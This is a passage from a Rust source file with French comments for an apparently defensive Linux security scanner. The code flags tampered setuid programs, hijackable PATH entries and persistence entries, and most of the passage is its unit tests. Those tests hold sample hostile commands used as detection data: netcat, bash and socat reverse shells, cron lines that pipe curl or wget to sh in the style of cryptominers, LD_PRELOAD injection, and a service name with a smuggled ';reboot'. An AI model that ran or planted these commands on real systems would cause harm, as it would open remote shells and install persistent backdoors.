        gestes_modifies,
        gestes_anormaux,
    } = r;
    let (n, non_verifies) = (*n, *non_verifies);
    let mut constats = Vec::new();
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Critique,
            trf!(
                "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer vos mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
            &[reinstaller],
        );
        // Retirer ses droits le rend inoffensif tout de suite ; la réinstallation reste à faire (elle les remet,
        // avec le programme d'origine).
        constats.push(crate::machine::defense::corriger(
            constat,
            trf!(
                "Retirer ses droits (setuid, capacités) pour qu'il ne puisse plus servir, puis le remettre depuis les dépôts ({}), lancer l'antivirus et changer vos mots de passe",
                "Remove its rights (setuid, capabilities) so it can no longer be used, then restore it from the repositories ({}), run the antivirus and change your passwords",
                reinstaller
            ),
            gestes_modifies,
        ));
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Eleve,
            trf!(
                "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
            &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
        );
        constats.push(crate::machine::defense::corriger(
            constat,
            tr!(
                "Leur retirer ces droits (setuid, setgid, capacités ; le fichier reste, Défaire les remet), puis chercher d'où ils viennent (ne pas les lancer)",
                "Remove those rights from them (setuid, setgid, capabilities; the file stays, Undo puts them back), then find out where they come from (do not run them)"
            ),
            gestes_anormaux,
        ));
    }
    // Un programme privilégié trouvé ne dit rien des capacités : getcap muet, elles n'ont pas été lues, et c'est dit.
    let trouves = !modifies.is_empty() || !anormaux.is_empty();
    if !capacites_lues && trouves {
        constats.push(crate::machine::impossible(
            "Fichiers suspects",
            tr!(
                "capacités des programmes : getcap absent",
                "program capabilities: getcap missing"
            ),
        ));
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let mut message = match (gestion, non_verifies) {
            (false, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (true, 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (true, k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if !capacites_lues {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;

    std::thread_local! {
        /// La dernière racine que `persistance_dans` a lue, sur ce fil d'essai.
        pub(super) static RACINE_LUE: std::cell::RefCell<Option<std::path::PathBuf>> =
            const { std::cell::RefCell::new(None) };
    }

    /// D7a : les lignes suspectes des fichiers du système partent par des gestes de défense (une par ligne, sans
    /// doublon) ; une seule ligne ailleurs (dossier personnel, crontab du compte, variable de la session), ou trop de
    /// lignes, et tout reste à la main.
    #[test]
    fn lancements_retires_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let lancement = |retraits: Vec<Option<(&str, &str)>>| {
            let n = retraits.len();
            constat_des_lancements(Lancements {
                critiques: Vec::new(),
                suspects: (0..n).map(|i| format!("suspect {i}")).collect(),
                sources: Vec::new(),
                retraits: retraits
                    .into_iter()
                    .map(|r| r.map(|(f, l)| (f.into(), l.into())))
                    .collect(),
                ..Lancements::default()
            })
            .correctif
            .unwrap()
        };
        let k = lancement(vec![
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/cron.d/maj", "* * * * * root curl http://exemple.test/x | sh")),
        ]);
        assert!(k.automatique);
        assert_eq!(k.commandes.len(), 2);
        assert!(
            k.commandes
                .iter()
                .all(|l| matches!(analyser(l), Some(GesteUnix::Defense(Defense::RetirerLigne(..), _))))
        );
        assert!(matches!(k.defaire, crate::machine::Defaire::Gestes(ref g) if g.len() == 2));
        // Un mélange : tout à la main.
        assert!(!lancement(vec![Some(("/etc/ld.so.preload", "/tmp/.x.so")), None]).automatique);
        assert!(
            !lancement(vec![
                Some(("/etc/ld.so.preload", "/tmp/.x.so")),
                Some(("/home/alice/.bashrc", "curl x | sh"))
            ])
            .automatique
        );
        // Un fichier au nom piégé n'est jamais désigné.
        assert!(!lancement(vec![Some(("/etc/cron.d/a b", "curl x | sh"))]).automatique);
        // Trop de lignes : à la main.
        let noms: Vec<String> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| format!("/etc/cron.d/t{i}"))
            .collect();
        assert!(!lancement(noms.iter().map(|f| Some((f.as_str(), "curl x | sh"))).collect()).automatique);
    }

    /// D7a : chaque service ajouté à la main se désactive par un geste, jamais une unité de session ni du réseau ; un
    /// nom qu'un geste ne porte pas laisse tout à la main, et le nom montré dans la commande est échappé.
    #[test]
    fn services_ajoutes_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let noms = |v: &[&str]| v.iter().map(|n| (*n).to_string()).collect::<Vec<_>>();
        let k = juger_services_ajoutes(
            &noms(&["maj.timer", "nftables.service", "sauvegarde.service", "sshd.service"]),
            true,
        )
        .unwrap()
        .correctif
        .unwrap();
        assert!(k.automatique);
        let unites: Vec<String> = k
            .commandes
            .iter()
            .map(|l| match analyser(l) {
                Some(GesteUnix::Defense(Defense::DesactiverService(u), _)) => u.as_str().to_string(),
                _ => panic!("geste attendu : {l}"),
            })
            .collect();
        assert_eq!(unites, ["maj.timer", "sauvegarde.service"]);
        assert!(
            !juger_services_ajoutes(&noms(&["a.service"]), false)
                .unwrap()
                .correctif
                .unwrap()
                .automatique
        );
        let k = juger_services_ajoutes(&noms(&["a.service", "x;reboot.service"]), true)
            .unwrap()
            .correctif
            .unwrap();
        assert!(!k.automatique);
        assert!(
            k.commandes.iter().all(|c| c.starts_with("systemctl cat '")),
            "{:?}",
            k.commandes
        );
        assert!(juger_services_ajoutes(&[], true).is_none());
    }

    /// Essai QEMU D7a (Debian) : getcap muet et un setuid hors paquet trouvé, les capacités non lues sont dites à part
    /// (jamais tues derrière l'alerte) ; getcap lu, rien de plus.
    #[test]
    fn capacites_non_lues_dites_meme_avec_une_alerte() {
        let releve = |capacites_lues| Releve {
            modifies: Vec::new(),
            anormaux: vec![std::path::PathBuf::from("/usr/local/bin/alice-x")],
            systeme: 3,
            gestion: true,
            non_verifies: 0,
            capacites_lues,
            path_dangereux: Vec::new(),
            reinstaller: String::new(),
            gestes_modifies: Vec::new(),
            gestes_anormaux: Vec::new(),
        };
        let muet = juger_fichiers_suspects(&releve(false));
        assert!(muet.iter().any(|c| !c.verifie && c.message.contains("getcap")));
        let lu = juger_fichiers_suspects(&releve(true));
        assert!(lu.iter().all(|c| c.verifie));
        assert_eq!(muet.len(), lu.len() + 1);
    }

    /// D7a : un programme privilégié perd son setuid ou ses capacités par un geste ; tous ou aucun : un chemin qu'un
    /// geste ne porte pas, un programme qui n'a plus rien de privilégié ou une liste trop longue laisse tout à la main.
    #[test]
    fn privilegies_par_gestes() {
        use crate::machine::gestes_unix::Defense;
        use std::path::PathBuf;
        const AUCUN: [Defense; 0] = [];
        let p = |s: &str| PathBuf::from(s);
        let modes = |m: u32| move |_: &Path| Some(m);
        let g = gestes_de_privilegies(
            &[p("/tmp/alice-x"), p("/tmp/alice-y")],
            &[p("/tmp/alice-y")],
            |c: &Path| {
                Some(if c == Path::new("/tmp/alice-x") {
                    0o104_755
                } else {
                    0o100_755
                })
            },
        );
        assert!(
            matches!(g.as_slice(), [Defense::RetirerSetuid(a), Defense::RetirerCapacites(b)]
                if a.octets() == b"/tmp/alice-x" && b.octets() == b"/tmp/alice-y"),
            "{g:?}"
        );
        let g = gestes_de_privilegies(&[p("/tmp/alice-x")], &[p("/tmp/alice-x")], modes(0o102_755));
        assert_eq!(g.len(), 2);
        // Plus rien de privilégié (changé depuis le parcours), ou lu par personne : à la main.
        assert_eq!(
            gestes_de_privilegies(&[p("/tmp/alice-x"), p("/tmp/alice-z")], &[], |c: &Path| {
                (c == Path::new("/tmp/alice-x")).then_some(0o104_755)
            }),
            AUCUN
        );
        // Chemin qu'un geste ne porte pas : relatif, à « .. », vide.
        for forge in ["tmp/x", "/tmp/../usr/bin/sudo", "", "/tmp/x/"] {
            assert!(
                gestes_de_privilegies(&[p("/tmp/alice-x"), p(forge)], &[], modes(0o104_755)).is_empty(),
                "{forge}"
            );
        }
        let neuf: Vec<PathBuf> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| p(&format!("/tmp/alice{i}")))
            .collect();
        assert_eq!(gestes_de_privilegies(&neuf, &[], modes(0o104_755)), AUCUN);
        assert_eq!(gestes_de_privilegies(&[], &[], modes(0o104_755)), AUCUN);
    }

    /// La ligne retirée est celle du fichier, fin « \r » comprise : l'empreinte que le fils root recalcule.
    #[test]
    fn ligne_telle_qu_ecrite() {
        assert_eq!(telle_qu_ecrite("a\r\nb\n", "a"), "a\r");
        assert_eq!(telle_qu_ecrite("a\nb", "b"), "b");
    }

    /// Le bilan lit la persistance depuis la vraie racine « / » : une autre (relative, ou absolue comme « /x »), le
    /// corpus, qui donne la sienne à `persistance_dans`, ne la verrait pas ; la racine lue est comparée à « / ».
    #[test]
    fn le_bilan_lit_depuis_la_racine() {
        RACINE_LUE.with(|r| *r.borrow_mut() = None);
        let _ = persistance();
        assert_eq!(
            RACINE_LUE.with(|r| r.borrow().clone()),
            Some(std::path::PathBuf::from("/"))
        );
    }

    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
    /// l'ordre de lecture et une ligne lue deux fois, non.
    #[test]
    fn nouvelle_ligne_nouvelle_cle() {
        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
        let r2 = "curl -s http://exemple.invalid/x | sh";
        let cle = |lignes: &[&str]| {
            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
        };
        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
        assert_ne!(cle(&[r1]), cle(&[r2]));
        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
        for ligne in [
            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
        ] {
            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
        }
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
        // curl ou à défaut wget, passé à sh.
        for cron in [
            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
        ] {
            assert_eq!(
                commande_suspecte(cron, false),
                Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                )),
                "{cron}"
            );
        }
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/vanguard surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    /// Le fichier qui lance un programme, tel qu'il est montré : court sous le dossier personnel, et inoffensif.
    #[test]
    fn fichiers_de_demarrage_montres() {
        let maison = Path::new("/home/alice");
        assert_eq!(
            court(Path::new("/home/alice/.config/autostart/x.desktop"), maison),
            "~/.config/autostart/x.desktop"
        );
        assert_eq!(court(Path::new("/etc/profile.d/a.sh"), maison), "/etc/profile.d/a.sh");
        assert_eq!(
            court(
                Path::new("/home/alice/.config/autostart/x\x1b]0;t\x07\x1b[2K\r\u{202e}.desktop"),
                maison
            ),
            "~/.config/autostart/x�]0;t��[2K��.desktop"
        );
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }

    /// Une arborescence jetable (racine, dossier personnel d'alice), et la lecture de sa persistance : le constat des
    /// lancements.
    struct Maison {
        racine: std::path::PathBuf,
    }

    impl Maison {
        fn nouvelle(nom: &str) -> Maison {
            let racine = crate::essais::temporaire().join(format!("vanguard-normal-{nom}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&racine);
            std::fs::create_dir_all(racine.join("home/alice/.config/systemd/user")).unwrap();
            Maison { racine }
        }

        fn chemin(&self, relatif: &str) -> std::path::PathBuf {
            self.racine.join("home/alice").join(relatif)
        }

        fn ecrire(&self, relatif: &str, texte: &str) {
            let p = self.chemin(relatif);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            let _ = std::fs::remove_file(&p);
            std::fs::write(p, texte).unwrap();
        }

        fn lancements(&self) -> Constat {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            )
            .into_iter()
            .next()
            .unwrap()
        }
    }

    impl Drop for Maison {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.racine);
        }
    }

    const UNITE: &str = "[Unit]\nDescription=Rappel\n\n[Service]\nType=oneshot\nExecStart=%h/.cache-x/rappel.sh\n";

    fn maison_avec_rappel(nom: &str) -> Maison {
        let m = Maison::nouvelle(nom);
        m.ecrire(".config/systemd/user/rappel.service", UNITE);
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        m
    }

    /// Le cas qui a mené à ce lot (valeurs inventées) : une unité de l'utilisateur lance un programme d'un dossier
    /// caché, à corriger soi-même. Elle se déclare normale, montre sa ligne, son fichier et le programme lancé ; le
    /// même état relu au bilan suivant est tu.
    #[test]
    fn unite_de_l_utilisateur_declarable() {
        use crate::machine::temoins::Temoins;
        let m = maison_avec_rappel("declarable");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        let k = c.correctif.as_ref().unwrap();
        assert!(!k.automatique, "une ligne du dossier personnel reste à la main");
        let Temoins::Releves(_) = c.temoins() else {
            panic!("{:?}", c.temoins());
        };
        let lignes = c.temoins().lignes();
        assert_eq!(lignes.len(), 1);
        assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
        assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
        assert!(lignes[0].contenant.is_some());
        assert_eq!(lignes[0].cibles.len(), 1);
        assert_eq!(lignes[0].cibles[0].chemin, "~/.cache-x/rappel.sh");
        assert!(crate::apprentissage::declarable(&c).is_ok());
        let encore = m.lancements();
        assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
        assert!(crate::apprentissage::essai_tait(&c, &encore));
    }

    /// Le modèle de menace du lot, cas par cas : après un choix « normal », chaque changement fait revenir l'alerte.
    #[test]
    fn tout_changement_fait_revenir_l_alerte() {
        type Changement = fn(&Maison);
        let cas: [(&str, Changement); 12] = [
            ("unité changée", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}Environment=LANG=C\n"),
                );
            }),
            ("unité remplacée par un lien au même contenu", |m| {
                m.ecrire(".local/share/ailleurs.service", UNITE);
                let p = m.chemin(".config/systemd/user/rappel.service");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".local/share/ailleurs.service"), &p).unwrap();
            }),
            ("programme lancé changé", |m| {
                m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl -s http://192.0.2.7/x | sh\n");
            }),
            ("programme lancé remplacé par un lien", |m| {
                m.ecrire(".cache-x/vrai.sh", "#!/bin/sh\necho rappel\n");
                let p = m.chemin(".cache-x/rappel.sh");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".cache-x/vrai.sh"), &p).unwrap();
            }),
            ("programme lancé effacé", |m| {
                std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
            }),
            ("ligne ajoutée dans le même fichier", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}ExecStartPost=%h/.cache-x/autre.sh\n"),
                );
            }),
            ("autre source dans la même alerte", |m| {
                m.ecrire(".config/autostart/maj.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
            }),
            ("ligne de la crontab dans un fichier lu", |m| {
                m.ecrire(".bashrc", "export LD_PRELOAD=/tmp/.l/libz.so\n");
            }),
            ("ajout (drop-in) posé", |m| {
                m.ecrire(".config/systemd/user/rappel.service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout de tous les services posé", |m| {
                m.ecrire(".config/systemd/user/service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout posé dans le dossier de la session", |m| {
                let d = m.racine.join("run/user/1000/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            ("même ligne, autre programme", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &UNITE.replace("rappel.sh", "rappel.sh --x"),
                );
            }),
        ];
        for (nom, changer) in cas {
            let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{nom}");
            changer(&m);
            let plus_tard = m.lancements();
            assert!(plus_tard.probleme >= Some(Niveau::Eleve), "{nom}");
            assert_ne!(declare.temoins().empreinte(), plus_tard.temoins().empreinte(), "{nom}");
            assert!(
                !crate::apprentissage::essai_tait(&declare, &plus_tard),
                "{nom} : l'alerte doit revenir"
            );
        }
    }

    /// Ce qui ne se relève pas ne se déclare pas normal : une commande ambiguë, un programme illisible, plus de
    /// lignes qu'on n'en montre ; un shell inversé non plus. Et une alerte qui ne se relève plus n'est plus tue.
    #[test]
    fn releves_refuses() {
        use crate::machine::temoins::{TEMOINS_MAX, Temoins};
        let refuse = |m: &Maison| matches!(m.lancements().temoins(), Temoins::Refuse(_));
        let m = Maison::nouvelle("ambigu");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/run $ARGUMENTS\n",
        );
        assert!(refuse(&m));
        assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        let m = Maison::nouvelle("inverse");
        m.ecrire(".bashrc", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n");
        assert!(refuse(&m));
        let m = Maison::nouvelle("trop");
        let unite = (0..=TEMOINS_MAX).fold(String::new(), |mut u, i| {
            u.push_str("ExecStartPre=%h/.x/etape");
            u.push_str(&i.to_string());
            u.push('\n');
            u
        });
        m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{unite}"));
        assert!(refuse(&m));
        // Le programme devenu illisible (un dossier à sa place) : le choix d'hier ne tait plus rien.
        let m = maison_avec_rappel("illisible");
        let declare = m.lancements();
        std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
        std::fs::create_dir_all(m.chemin(".cache-x/rappel.sh")).unwrap();
        let plus_tard = m.lancements();
        assert!(matches!(plus_tard.temoins(), Temoins::Refuse(_)));
        assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard));
    }

    /// Le refus d'une alerte, tel qu'il se montre.
    fn refus(c: &Constat) -> String {
        match c.temoins() {
            crate::machine::temoins::Temoins::Refuse(r) => r.clone(),
            autre => panic!("refus attendu : {autre:?}"),
        }
    }

    /// Relecture E, C2 : ce qui redirige une ligne acceptée sans toucher aux fichiers liés ne se déclare pas normal ;
    /// un ajout (drop-in) qui change le dossier personnel, les bibliothèques ou les variables, une unité du même nom
    /// qui passe avant, même écrit sur des lignes continuées.
    #[test]
    fn unite_redirigee_refusee() {
        let cas: [(&str, &str, &str); 6] = [
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=HOME=/tmp/h\n",
                "HOME",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironmentFile=%h/.e\n",
                "EnvironmentFile",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=\"LANG=C\" \\\n  LD_PRELOAD=/tmp/l.so\n",
                "LD_PRELOAD",
            ),
            (
                "service.d/x.conf",
                "[Service]\nEnvironment=PYTHONPATH=/tmp\n",
                "PYTHONPATH",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nWorkingDirectory=/tmp\nExecSearchPath=/tmp\n",
                "ExecSearchPath",
            ),
            ("../user.control/rappel.service", UNITE, "user.control"),
        ];
        for (fichier, texte, attendu) in cas {
            let m = maison_avec_rappel(&format!("redirigee-{}", attendu.len()));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{attendu}");
            m.ecrire(&format!(".config/systemd/user/{fichier}"), texte);
            let plus_tard = m.lancements();
            assert!(refus(&plus_tard).contains(attendu), "{attendu} : {}", refus(&plus_tard));
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{attendu}");
        }
        // Sans dossier de la session, ce que systemd y ajouterait ne se vérifie pas.
        let m = maison_avec_rappel("sans-session");
        let c = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(refus(&c).contains("XDG_RUNTIME_DIR"));
    }

    /// Relecture E, C7 : un shell inversé se lit sans ambiguïté, mais ne se déclare jamais normal.
    #[test]
    fn porte_derobee_jamais_declarable() {
        for ligne in [
            "ExecStart=/usr/bin/nc -e /bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/ncat --sh-exec=/bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/socat TCP:192.0.2.7:4444 EXEC:/bin/sh",
        ] {
            let m = Maison::nouvelle(&format!("porte-{}", ligne.len()));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{ligne}\n"));
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{ligne}");
            assert!(refus(&c).contains("porte dérobée"), "{ligne} : {}", refus(&c));
        }
    }

    /// Relecture E, B2 : « bash script » lie le script, pas seulement bash ; M3 : une ligne Lua qui colle autre chose
    /// à la commande ne se déclare pas ; M9 : une unité qui n'est pas de l'UTF-8 se lit quand même.
    #[test]
    fn scripts_lua_et_octets() {
        let m = Maison::nouvelle("script");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nExecStart=/usr/bin/bash %h/.cache-x/rappel.sh\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let c = m.lancements();
